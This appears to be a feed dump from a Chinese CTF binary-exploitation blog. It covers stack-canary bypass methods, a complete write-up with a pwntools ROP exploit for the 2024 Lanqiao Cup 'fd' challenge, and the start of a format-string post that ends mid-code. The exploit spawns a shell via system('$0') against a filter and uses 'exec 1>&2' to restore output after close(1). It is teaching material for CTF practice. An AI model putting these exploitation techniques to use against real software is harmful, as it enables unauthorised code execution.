class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span><span class="token keyword">_Bool</span> need_backtrace<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  Don't pass down     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]     may point to the corrupted stack.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>need_backtrace <span class="token operator">?</span> <span class="token punctuation">(</span>do_abort <span class="token operator">|</span> do_backtrace<span class="token punctuation">)</span> <span class="token operator">:</span> do_abort<span class="token punctuation">,</span>    <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span>    <span class="token punctuation">(</span>need_backtrace <span class="token operator">&amp;&amp;</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span>     <span class="token operator">?</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span>true<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>但是，Ubuntu 22.04 使用的是 Glibc 2.35，在该 Glibc 版本中不存在 <code>__libc_argv[0]</code> 参数了，源码如下：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.35/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strong_alias</span> <span class="token punctuation">(</span>__stack_chk_fail<span class="token punctuation">,</span> __stack_chk_fail_local<span class="token punctuation">)</span><span class="token comment">// ./glibc-2.35/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">,</span> <span class="token string">"*** %s ***: terminated\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><em>因此如果想在 Ubuntu 22.04 或较新版本 Glibc 的机器上进行本地测试，需要更换 Glibc 版本，建议 Glibc 2.25 以下版本</em></p></blockquote><p>对于 <code>__libc_argv[0]</code> 的地址，在 GDB 中可以直接查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="华为杯2023-ez_ssp12.png"></p><p>另外，还需要了解一个重要函数 <code>environ</code></p><p><code>environ</code> 存在于 libc 中，是一个全局变量，储存着系统的环境变量，因此 <code>environ</code> 是连接 libc 地址与栈地址的桥梁</p><p>系统的环境变量在程序的栈中长这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="华为杯2023-ez_ssp15.png"></p><blockquote><p>通过 libc 偏移计算得到 <code>environ</code> 的真实地址后，泄露 <code>environ</code> 的真实地址处存放的值，就可以得到保存在栈中的环境变量的真实地址</p><p>通过环境变量的首地址与栈上其他位置的偏移，我们就可以得到栈上任意变量的地址</p><p><em>配合 SSP Leak，虽然我们不能直接获得 shell，但是可以实现栈上的任意地址读</em></p></blockquote><p>具体例题见本站的《<a href="%E3%80%90%E5%8D%8E%E4%B8%BA%E6%9D%AF%202023%E3%80%91ez_ssp.md">【华为杯 2023】ez_ssp</a>》</p><hr><h2 id="劫持-stack-chk-fail-绕过-Canary"><a href="#劫持-stack-chk-fail-绕过-Canary" class="headerlink" title="劫持 __stack_chk_fail 绕过 Canary"></a>劫持 <code>__stack_chk_fail</code> 绕过 Canary</h2><blockquote><p>Canary 的机制就是检测到溢出后执行 <code>__stack_chk_fail</code> 函数是程序崩溃，因此如果我们可以劫持 <code>__stack_chk_fail</code> 函数，例如将 <code>__stack_chk_fail</code> 函数的 GOT 表地址改为后门函数的地址，那么触发 Canary 后就会执行后门函数了</p><p>使用条件：<br><mark>需要存在格式化字符串漏洞</mark></p></blockquote><p>具体例题见本站的《<a href="%E3%80%90BJDCTF%202nd%E3%80%91r2t4.md">【BJDCTF 2nd】r2t4</a>》</p><hr><h2 id="修改-TLS-结构体控制-Canary"><a href="#修改-TLS-结构体控制-Canary" class="headerlink" title="修改 TLS 结构体控制 Canary"></a>修改 TLS 结构体控制 Canary</h2><blockquote><p>TLS 全称为 Thread Local Storage，是一种线程私有的数据存储方式，每个线程都有自己的局部存储空间，可以在其中存储线程私有的数据</p><p>因为 Canary 会被储存在 TLS 中，在函数返回前会使用这个值进行对比，如果溢出的长度足够大，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过</p><p>使用条件：<br><mark>1. 溢出字节够大，通常至少一个 page（4K）</mark><br><mark>2. 创建一个线程，在线程内栈溢出</mark></p></blockquote><p>在 64 位程序中，TLS 由 FS 寄存器指向，通常为 <code>FS:28h</code></p><p>在 32 位程序中，TLS 由 GS 寄存器指向，通常为 <code>GS:14h</code></p><p>TLS 在 Glibc 中的实现为 <code>tcbhead_t(TCB)</code> 结构体，其中 <code>stack_guard</code> 变量存储的值就是 Canary，其结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the TCB.  Not necessarily the                           thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>    <span class="token comment">// 储存 Canary 的值</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.     Bit 1: X86_FEATURE_1_SHSTK.   */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* GCC split stack support.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>  <span class="token comment">/* The lowest address of shadow stack,  */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成随机数 Canary 的位置：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span><span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>当程序创建线程的时候，会顺便创建一个 TLS 用来存储线程私有的数据，该 TLS 也会存储 Canary 的值，而 TLS 会保存在栈的高地址处 <strong>（这也是为什么说同一个进程中的不同线程的 Canary 是相同的）</strong></p></blockquote><p>因此，我们只要覆盖 TLS 中 Canary 的值，那么整个程序的 Canary 的值就是由我们来定的了</p><p>在子线程中可以通过如下指令查看 TLS 在栈上的首地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="【starctf2018】babystack10.png"></p><blockquote><p>在 64 位程序中，Canary 与 TLS 首地址偏移 28h</p><p>在 32 位程序中，Canary 与 TLS 首地址偏移 14h</p></blockquote><p>具体例题见本站的《<a href="%E3%80%90Star%20Ctf%202018%E3%80%91babystack.md">【Star Ctf 2018】babystack</a>》</p><hr><h2 id="数组下标越界绕过-Canary"><a href="#数组下标越界绕过-Canary" class="headerlink" title="数组下标越界绕过 Canary"></a>数组下标越界绕过 Canary</h2><blockquote><p>当程序中存在数组，并且没有对数组的边界进行检查时，可以通过使数组的下标越界来直接修改返回地址，从而绕过 Canary</p><p>使用条件：<br><mark>程序的栈中存在数组</mark></p></blockquote><p>假设栈中的结构如下图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack15.png" alt="【starctf2018】babystack15.png"></p><p>其中 <code>arr[]</code> 是一个长度为 4 的数组，正常来说，数组元素只有 <code>arr[0] ~ arr[3]</code></p><p>由于数组本身也是利用指针寻址的，例如 <code>uint_32</code> 型的数组 <code>a[]</code> 中，<code>a[i]</code> 与 <code>*(a + i * 4)</code> 本质上是一样的</p><p>因此如果没有对数组的边界进行检查，那么上图中的 <code>arry[7]</code> 就代表栈上的返回地址了，即使 <code>arry[7]</code> 在数组 <code>arry[]</code> 中下标越界</p><p>具体例题见本站的《<a href="%E3%80%90wustctf%202020%E3%80%91name_your_cat.md">【wustctf 2020】name_your_cat</a>》</p><hr><h2 id="C-异常机制绕过-Canary"><a href="#C-异常机制绕过-Canary" class="headerlink" title="C++ 异常机制绕过 Canary"></a>C++ 异常机制绕过 Canary</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/89855%E3%80%91">Shanghai-DCTF-2017 线下攻防Pwn题 - 安全客，安全资讯平台</a></p>]]></content>
    
    
    <summary type="html">主要介绍里一些如何 Bypass 一些常见安全机制的方法，例如绕过 Canary、PIE 等等</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【蓝桥杯 2024】fd</title>
    <link href="https://www.uf4te.cn/posts/7895a21b.html"/>
    <id>https://www.uf4te.cn/posts/7895a21b.html</id>
    <published>2024-05-11T12:52:14.000Z</published>
    <updated>2024-06-05T06:36:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用 <code>system(&quot;$0&quot;)</code> 这种不常见的方式获取 shell</p></li><li><p>利用 <code>exec 1&gt;&amp;2</code> 重定向绕过 <code>close(1)</code></p></li></ul><hr><p><a href="https://match.ichunqiu.com/without">（2024年4月27日）【蓝桥杯2024】fd</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析程序保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd1.png" alt="PWN-蓝桥杯2024_fd1.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd2.png" alt="PWN-蓝桥杯2024_fd2.png"></p><p>程序逻辑是比较简单的，首先向 <code>info</code> 所在地址输入 0xE 的长度</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd5.png" alt="PWN-蓝桥杯2024_fd5.png"></p><p><code>info</code> 位于 BSS 段上</p><p>然后 <code>buf</code> 处存在明显溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd6.png" alt="PWN-蓝桥杯2024_fd6.png"></p><p>并且程序中存在 <code>system()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd7.png" alt="PWN-蓝桥杯2024_fd7.png"></p><p>但没有 <code>&quot;/bin/sh&quot;</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd8.png" alt="PWN-蓝桥杯2024_fd8.png"></p><p>因此，很自然地想到通过 <code>info</code> 往 BSS 段写入 <code>&quot;/bin/sh&quot;</code> 然后溢出 <code>buf</code> 构造 <code>system(&quot;/bin/sh&quot;)</code></p><p>但如果真是这样，就没必要有这篇文章了哈哈哈</p><p>因为发现在输入 <code>buf</code> 后会执行一个 <code>check()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd3.png" alt="PWN-蓝桥杯2024_fd3.png"></p><p>这里会检测我们输入到 <code>info</code> 处的数据，不能包含 <code>&#39;b&#39;</code>、<code>&#39;i&#39;</code>、<code>&#39;n&#39;</code>、<code>&#39;/&#39;</code>、<code>&#39;s&#39;</code></p><p>同时也不能存在连续三个字符为 <code>&quot;cat&quot;</code></p><p>因此，我们构造 <code>system(&quot;/bin/sh&quot;)</code>、<code>system(&quot;sh&quot;)</code>、<code>system(&quot;cat flag&quot;)</code> 都是行不通的</p><p>所以这里要用到一个比较少见的获取 shell 的方式：<code>system(&quot;$0&quot;)</code></p><blockquote><p><code>$0</code> 是 Linux shell 中的一个环境变量，指的是 shell 本身的文件名，因此 <code>system(&quot;$0&quot;)</code> 的功能等价于 <code>system(&quot;/bin/sh&quot;)</code></p><p>另外，还有 <code>$1</code> 和 <code>$2</code> 等：</p><p><code>$1</code> 是传递给该 shell 脚本的第一个参数</p><p><code>$2</code> 是传递给该 shell 脚本的第二个参数</p></blockquote><p>但这样也还没有结束，因为即使我们绕过了检测，这个函数的返回值是 <code>close(1)</code></p><p>先来看看 <code>close()</code> 是个什么函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd4.png" alt="PWN-蓝桥杯2024_fd4.png"></p><p>这里的 <code>fd</code> 明显是文件描述符，也就是关闭了文件描述符 1 的功能</p><blockquote><p>Linux 下的三种文件描述符：</p><p><code>fd = 0</code>：标准输入文件 <code>stdin</code><br><code>fd = 1</code>：标准输出文件 <code>stdout</code><br><code>fd = 2</code>：标准错误输出文件 <code>stderr</code></p></blockquote><p>因此这里是关闭了标准输出的功能</p><p>在获取 shell 后的表现是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd9.png" alt="PWN-蓝桥杯2024_fd9.png"></p><p>可以看到，我们已经通过构造 <code>system(&quot;$0&quot;)</code> 获取了 shell，但是 <code>ls</code>、<code>cat</code> 等指令是无法使用的</p><p>因为这些指令都需要使用到 Linux 的标准输出，也就是 <code>fd = 1</code>，而这里使用 <code>close(1)</code> 关闭了标准输出</p><p>但是可以通过重定向来绕过，使用如下命令实现重定向：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># 也可以简写为：exec >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd10.png" alt="PWN-蓝桥杯2024_fd10.png"></p><p>当然，我们也可以不使用 <code>exec 1&gt;&amp;2</code>，而是直接执行指令，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token file-descriptor important">&amp;2</span>   <span class="token comment"># 也可以简写为：whoami >&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd11.png" alt="PWN-蓝桥杯2024_fd11.png"></p><blockquote><p>一些重定向的知识：</p><p><code>1&gt;&amp;2</code>：把标准输出重定向到标准错误<br><code>2&gt;&amp;1</code>：把标准错误输出重定向到标准输出<br><code>&amp;&gt;filename</code>：把标准输出和标准错误输出都重定向到文件 filename 中</p><p>例如常见的重定向：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"xxx"</span> <span class="token operator">></span> filename.txt <span class="token comment"># 把 "xxx" 写入到 filename.txt 文件中</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.93.142.240"</span><span class="token punctuation">,</span> <span class="token number">44180</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"restricted stack.\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'$0\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>info_addr <span class="token operator">=</span> <span class="token number">0x601090</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400933</span>ret <span class="token operator">=</span> <span class="token number">0x4005ae</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_plt --->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>info_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd12.png" alt="PWN-蓝桥杯2024_fd12.png"></p>]]></content>
    
    
    <summary type="html">思路是常见的 ROP，但是限制了 system() 的参数，无法使用 &quot;/bin/sh&quot;、&quot;sh&quot;、&quot;cat flag&quot; 之类的操作，但可以通过 system(&quot;$0&quot;) 实现相同的效果，同时利用 exec 1&gt;&amp;2 重定向绕过 close(1)</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>【你想有多PWN】fmt_test2</title>
    <link href="https://www.uf4te.cn/posts/ba83bd5d.html"/>
    <id>https://www.uf4te.cn/posts/ba83bd5d.html</id>
    <published>2024-04-22T11:39:42.000Z</published>
    <updated>2024-06-05T06:36:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用格式化字符串泄露栈中的数据，判断输入的数据位于栈空间的哪个位置</p></li><li><p><mark>在程序开启 PIE 时，利用格式化字符串漏洞泄露栈上的真实返回地址，然后根据 ELF 文件中函数的偏移推算出其他函数的真实地址</mark></p></li><li><p>根据已经泄露的真实地址，利用 libc 偏移计算 <code>system()</code> 和 <code>b&#39;/bin/sh&#39;</code> 的地址</p></li><li><p>使用 Pwntools 中的 <code>fmtstr_payload()</code> 构造格式化字符串的利用，将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code></p></li><li><p><mark>注意 32 位程序与 64 位程序在使用 <code>%参数顺序$格式化说明符</code> 进行地址泄露时的区别</mark></p></li></ul><hr><h1 id="fmt-str-level-1-x86"><a href="#fmt-str-level-1-x86" class="headerlink" title="fmt_str_level_1_x86"></a>fmt_str_level_1_x86</h1><p>源代码如下：（这里 gcc 编译时使用 <code>-z lazy</code> 来实现 Partial RELRO）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span 